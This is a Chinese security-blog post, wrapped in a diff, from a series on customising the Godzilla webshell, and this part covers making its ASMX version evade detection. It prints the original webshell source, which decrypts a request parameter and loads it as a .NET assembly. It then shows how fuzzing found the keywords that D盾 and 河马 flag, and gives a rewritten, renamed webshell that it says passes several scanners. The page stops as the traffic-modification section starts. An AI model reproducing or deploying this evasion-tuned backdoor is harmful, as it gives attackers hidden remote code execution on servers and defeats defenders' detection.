@@ -1,0 +1,427 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>哥斯拉二开从0到1-5(asmx免杀) | Bohemian</title><meta name="author" content="bohemian"><meta name="copyright" content="bohemian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言上面的文章做了动态的免杀，以及基于时间的密钥动态处理，计划中做一下其他语言的免杀及流量修改，本篇文章做一下asmx流量修改及免杀。 asmx简介ASMX 文件是一个用于在 ASP.NET Web 服务中定义和处理请求的文件格式。它通常用于创建基于 XML 的 Web..."><link rel="shortcut icon" href="/images/website/favicon.png"><link rel="canonical" href="https://bohemian.top/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?akkUkVXulwUkbwBp";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-3Z9EQ7RWNS"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-3Z9EQ7RWNS')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-3Z9EQ7RWNS', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><link rel="stylesheet" href="/-a" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '哥斯拉二开从0到1-5(asmx免杀)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/website/avatar.jpg" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/哥斯拉二开从0到1/image-20241114102655833.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Bohemian</span></a><a class="nav-page-title" href="/"><span class="site-name">哥斯拉二开从0到1-5(asmx免杀)</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">哥斯拉二开从0到1-5(asmx免杀)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-24T09:37:43.000Z" title="发表于 2025-01-24 17:37:43">2025-01-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-26T14:50:53.300Z" title="更新于 2025-01-26 22:50:53">2025-01-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3,245</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>上面的文章做了动态的免杀，以及基于时间的密钥动态处理，计划中做一下其他语言的免杀及流量修改，本篇文章做一下asmx流量修改及免杀。</p>
+<h5 id="asmx简介"><a href="#asmx简介" class="headerlink" title="asmx简介"></a>asmx简介</h5><p><code>ASMX</code> 文件是一个用于在 ASP.NET Web 服务中定义和处理请求的文件格式。它通常用于创建基于 XML 的 Web 服务，允许客户端与服务器进行远程交互，传输数据并执行方法。ASMX 文件通常包含服务的代码和定义，用来处理 Web 服务的请求和响应。</p>
+<p>Web 服务（也叫做 XML Web Service）是一种能够接收来自互联网或局域网中其他系统的请求，提供轻量级通信的独立技术。Web 服务通过 SOAP 协议在 Web 上提供功能，通常由 WSDL 文件描述，并通过 UDDI 注册。</p>
+<ol>
+<li><strong>SOAP</strong>（简单对象访问协议）：它是 XML Web 服务的通信协议，定义了如何通过 HTTP 或其他底层协议来调用 Web 服务中的方法。SOAP 使用 XML 格式的消息进行通信。</li>
+<li><strong>WSDL</strong>（Web 服务描述语言）：一个 XML 文档，用于描述 Web 服务的操作以及如何交换数据。WSDL 文件通常由软件自动生成，并且可以通过 UDDI 进行注册。</li>
+<li><strong>UDDI</strong>（统一描述、发现与集成）：一种标准的 Web 服务目录，允许 Web 服务注册并被其他系统发现。</li>
+</ol>
+<p>.asmx是webservice服务程序的后缀名，ASP.NET 使用.asmx 文件来对Web Services的支持。.asmx 文件和.aspx文件一样都属于文本文件。它包含在.aspx文件之中，成为ASP.NET应用程序的一部分。</p>
+<p>具有 .asmx 扩展名的文件是一种 ASP.NET Web 服务文件，它使用简单对象访问协议 (SOAP) 在 Internet 上提供两个对象之间的通信。它作为服务部署在基于 Windows 的 Web 服务器上，用于处理传入请求并返回响应。与包含 ASP.NET 网页可视化显示代码的ASPX文件不同，ASMX 文件在后台运行在服务器上，并执行不同的任务，例如连接数据库、检索数据和返回数据提出请求的格式。这些专门用于 XML Web 服务。</p>
+<p>说那么多，不如一见，我们在打战的时候经常会见到这种页面，那么这种也页面就是采用的这种形式。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250124180239062.png" alt="image-20250124180239062"></p>
+<p>来看一下传参方式，这里是一个计算器，有四种方法，加减乘除。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126164320685.png" alt="image-20250126164320685"></p>
+<p>这里选择加，可以看到有两个参数num，采用xml的传参方式</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/aspx/time/calc.asmx</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.205</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>length</span><br><span class="line"><span class="attribute">SOAPAction</span><span class="punctuation">: </span>&quot;http://tempuri.org/Add&quot;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:soap</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">Add</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://tempuri.org/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">num1</span>&gt;</span>double<span class="tag">&lt;/<span class="name">num1</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">num2</span>&gt;</span>double<span class="tag">&lt;/<span class="name">num2</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">Add</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126164744661.png" alt="image-20250126164744661"></p>
+<p>这里经过笔者测试，这个<code>SOAPAction: &quot;http://tempuri.org/Add&quot;</code>经过测试是可以去掉的。不写这一句也没问题。以下咱们就给他去掉好了，少一句话，就少一个特征，宁可信其有，不可以信其无。好，本编主要看的是asmx免杀这里就简单讲一下格式，一会还会看到。</p>
+<h5 id="asmx免杀"><a href="#asmx免杀" class="headerlink" title="asmx免杀"></a>asmx免杀</h5><p>先简单来看一下哥斯拉原版asmx木马。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ WebService Language=&quot;C#&quot; Class=&quot;WebService1&quot; %&gt;</span><br><span class="line">public class WebService1 : System.Web.Services.WebService</span><br><span class="line">&#123;</span><br><span class="line">    [System.Web.Services.WebMethod(EnableSession = true)]</span><br><span class="line">    public string asd(string asd)</span><br><span class="line">    &#123;</span><br><span class="line">        System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            string key = &quot;544e864796f05937&quot;;</span><br><span class="line">            string bohemian_pass = &quot;asd&quot;;</span><br><span class="line">            string md5 = System.BitConverter.ToString(</span><br><span class="line">                new System.Security.Cryptography.MD5CryptoServiceProvider()</span><br><span class="line">                .ComputeHash(System.Text.Encoding.Default.GetBytes(asd_pass + key))</span><br><span class="line">            ).Replace(&quot;-&quot;, &quot;&quot;);</span><br><span class="line">            byte[] data = System.Convert.FromBase64String(System.Web.HttpUtility.UrlDecode(bohemian));</span><br><span class="line">            data = new System.Security.Cryptography.RijndaelManaged()</span><br><span class="line">                .CreateDecryptor(</span><br><span class="line">                    System.Text.Encoding.Default.GetBytes(key), </span><br><span class="line">                    System.Text.Encoding.Default.GetBytes(key)</span><br><span class="line">                )</span><br><span class="line">                .TransformFinalBlock(data, 0, data.Length);</span><br><span class="line"></span><br><span class="line">            if (Context.Session[&quot;payload&quot;] == null)</span><br><span class="line">            &#123;</span><br><span class="line">                Context.Session[&quot;payload&quot;] = (System.Reflection.Assembly)</span><br><span class="line">                    typeof(System.Reflection.Assembly)</span><br><span class="line">                    .GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;)</span><br><span class="line">                    .Invoke(null, new object[] &#123; data &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                object o = ((System.Reflection.Assembly)Context.Session[&quot;payload&quot;]).CreateInstance(&quot;LY&quot;);</span><br><span class="line">                System.IO.MemoryStream outStream = new System.IO.MemoryStream();</span><br><span class="line">                o.Equals(Context);</span><br><span class="line">                o.Equals(outStream);</span><br><span class="line">                o.Equals(data);</span><br><span class="line">                o.ToString();</span><br><span class="line">                byte[] r = outStream.ToArray();</span><br><span class="line">                stringBuilder.Append(md5.Substring(0, 16));</span><br><span class="line">                stringBuilder.Append(</span><br><span class="line">                    System.Convert.ToBase64String(</span><br><span class="line">                        new System.Security.Cryptography.RijndaelManaged()</span><br><span class="line">                        .CreateEncryptor(</span><br><span class="line">                            System.Text.Encoding.Default.GetBytes(key), </span><br><span class="line">                            System.Text.Encoding.Default.GetBytes(key)</span><br><span class="line">                        )</span><br><span class="line">                        .TransformFinalBlock(r, 0, r.Length)</span><br><span class="line">                    )</span><br><span class="line">                );</span><br><span class="line">                stringBuilder.Append(md5.Substring(16));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (System.Exception)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        return stringBuilder.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单看一下，其实和aspx的木马差不多的。无非是一些细节上不一样。加载方式、函数啥的。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126165948109.png" alt="image-20250126165948109"></p>
+<p>放到d盾中，5级。我们进行一下简单fuzz。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126170127598.png" alt="image-20250126170127598"></p>
+<p>直接删一般，看到报2级，应该是还有问题。</p>
+<p>根据以往经验，大概率是加密问题，data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(</p>
+<p>这句中RijndaelManaged这个函数，是加密使用的，我们给他删掉</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126170417879.png" alt="image-20250126170417879"></p>
+<p>这样就没问题了，那么还是要用的，经过搜索，我们可以用<code>AesManaged()</code>函数代替</p>
+<p><code>data = new System.Security.Cryptography..CreateDecryptor(changshangsan, changshangsan).TransformFinalBlock(data, 0, data.Length);</code>也就是说像这样写就可以了。</p>
+<p>刚刚删掉的那一段拿回来继续fuzz一下。</p>
+<p>这里fuzz后是<code> Context.Session[&quot;payload&quot;] = (System.Reflection.Assembly)                     typeof(System.Reflection.Assembly)                     .GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;)                     .Invoke(null, new object[] &#123; data &#125;);</code></p>
+<p>可以看到是加载data的，我们进行改写一下，笔者在fuzz的时候，大概率是load或者payload的问题，还有这个invoke，也是威胁的。</p>
+<p><code>            if (Context.Session[&quot;changshangyi&quot;] == null) &#123;     AppDomain currentDomain = AppDomain.CurrentDomain;     byte[] assemblyData = data;     System.IO.MemoryStream assemblyStream = new System.IO.MemoryStream(assemblyData);     System.Reflection.Assembly assembly = currentDomain.Load(assemblyStream.ToArray());     Context.Session[&quot;changshangyi&quot;] = assembly;</code></p>
+<p>写的时候，我们给他换种写法，把关键字给他去掉</p>
+<p>data为获取到的很多方法</p>
+<p><strong><code>system.IO.MemoryStream assemblyStream = new System.IO.MemoryStream(assemblyData);</code></strong></p>
+<ul>
+<li>使用字节数组 <code>assemblyData</code> 创建一个内存流对象 <code>assemblyStream</code>。</li>
+<li>内存流允许字节数组的操作模拟文件流，方便后续处理。</li>
+</ul>
+<p><strong><code>System.Reflection.Assembly assembly = currentDomain.Load(assemblyStream.ToArray());</code></strong></p>
+<ul>
+<li>将内存流的数据转换为字节数组并加载为程序集 (<code>Assembly</code>) 对象。</li>
+<li><strong><code>currentDomain.Load</code></strong> 会在当前应用程序域中动态加载该程序集，类似于运行时将 DLL 文件加载进来。</li>
+</ul>
+<p>在同一个用户的后续请求中，代码可以直接从 <code>Session</code> 获取已经加载的程序集，而不必重复加载。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126171955261.png" alt="image-20250126171955261"></p>
+<p>这样，我们就改好了，这样就没有问题了。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126172311033.png" alt="image-20250126172311033"></p>
+<p>看一下是否能用。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126172336812.png" alt="image-20250126172336812"></p>
+<p>使用起来也没有问题。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126172402151.png" alt="image-20250126172402151"></p>
+<p>好的，我们来看看其他平台。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126172525677-17378835258941.png" alt="image-20250126172525677"></p>
+<p>这里我们可以看到河马直接就给杀了，还识别出来是godzilla。</p>
+<p>我们在进行fuzz。经过笔者fuzz后，我发现是MD5的锅。只要有md5就报。</p>
+<p> string md5 = System.BitConverter.ToString(<br>                new System.Security.Cryptography.MD5CryptoServiceProvider()<br>                .ComputeHash(System.Text.Encoding.Default.GetBytes(bohemian_pass + key))<br>            ).Replace(“-“, “”);</p>
+<p>原版的木马中是加载了md5的，这里可以看到。我们知道，godzilla，在木马层面，md5在木马中的作用主要是将pass+key进行MD5，上几期都知道，我们改过的流量，不在进行md5做识别了，所以，一会我们将不会用到md5了，直接在木马中删掉md5就可以了。一会在定义一个其他的。</p>
+<p>试下河马</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126173336923.png" alt="image-20250126173336923"></p>
+<p>ok，这样就没问题了。</p>
+<p>这样就差不多了，我们在优化一下其中的一些字符串，在其他平台可能不行。比如payload，或者一些变量的定义啥的，都给他改改。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ WebService Language=&quot;C#&quot; Class=&quot;WebService1&quot; %&gt;</span><br><span class="line">using System;</span><br><span class="line">public class WebService1 : System.Web.Services.WebService</span><br><span class="line">&#123;</span><br><span class="line">    [System.Web.Services.WebMethod(EnableSession = true)]</span><br><span class="line">    public string asd(string asd)</span><br><span class="line">    &#123;</span><br><span class="line">        System.Text.StringBuilder changshansi = new System.Text.StringBuilder();</span><br><span class="line">        </span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">        </span><br><span class="line">            byte[] changshangsan = System.Text.Encoding.Default.GetBytes(&quot;7815696ecbf1c96e&quot;);</span><br><span class="line">            byte[] changshangjiu = System.Convert.FromBase64String(System.Web.HttpUtility.UrlDecode(asd));</span><br><span class="line">            changshangjiu = new System.Security.Cryptography.AesManaged()</span><br><span class="line">                    .CreateDecryptor(changshangsan, changshangsan)</span><br><span class="line">                    .TransformFinalBlock(changshangjiu, 0, changshangjiu.Length);</span><br><span class="line">            if (Context.Session[&quot;changshangyi&quot;] == null)</span><br><span class="line">&#123;</span><br><span class="line">    AppDomain currentDomain = AppDomain.CurrentDomain;</span><br><span class="line">    byte[] changshangqi = changshangjiu;</span><br><span class="line">    System.IO.MemoryStream changshangliu = new System.IO.MemoryStream(changshangqi);</span><br><span class="line">    System.Reflection.Assembly changshangwu = currentDomain.Load(changshangliu.ToArray());</span><br><span class="line">    Context.Session[&quot;changshangyi&quot;] = changshangwu;</span><br><span class="line">&#125;else&#123;object changshanger = ((System.Reflection.Assembly)Context.Session[&quot;changshangyi&quot;])</span><br><span class="line">                            .CreateInstance(&quot;LY&quot;);</span><br><span class="line">                System.IO.MemoryStream changshangshi = new System.IO.MemoryStream();</span><br><span class="line">                changshanger.Equals(Context);</span><br><span class="line">                changshanger.Equals(changshangshi);</span><br><span class="line">                changshanger.Equals(changshangjiu);</span><br><span class="line">                changshanger.ToString();</span><br><span class="line">                byte[] r = changshangshi.ToArray();</span><br><span class="line">                string qwe = &quot;&lt;data&gt;&quot;;</span><br><span class="line">                changshansi.Append(qwe);</span><br><span class="line">                changshansi.Append(System.Convert.ToBase64String(</span><br><span class="line">                    new System.Security.Cryptography.AesManaged()</span><br><span class="line">                        .CreateEncryptor(changshangsan, changshangsan)</span><br><span class="line">                        .TransformFinalBlock(r, 0, r.Length)));</span><br><span class="line">                      changshansi.Append(qwe);  </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (System.Exception)</span><br><span class="line">        &#123;</span><br><span class="line">            // Handle exceptions here (optional)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return changshansi.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大概就是这样。对一些字符串进行可简单优化</p>
+<p>这里原版木马有一句<code>string bohemian_pass = &quot;asd&quot;;</code> 这个乍一看就是定义的密码，其实全文追下来会发现，并没有调用这个，索性，也给他去掉了。</p>
+<p>vt，其实vt对webshell类不感冒的。</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126174824604.png" alt="image-20250126174824604"></p>
+<p>微步</p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126175046630.png" alt="image-20250126175046630"></p>
+<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126175100822.png" alt="image-20250126175100822"></p>
+<p>其他的火绒 360就不测试了。也没啥问题。</p>
+<h5 id="asmx流量修改"><a href="#asmx流量修改" class="headerlink" title="asmx流量修改"></a>asmx流量修改</h5><p>免杀已经做完了，那接下来就是流量修改了。</p>
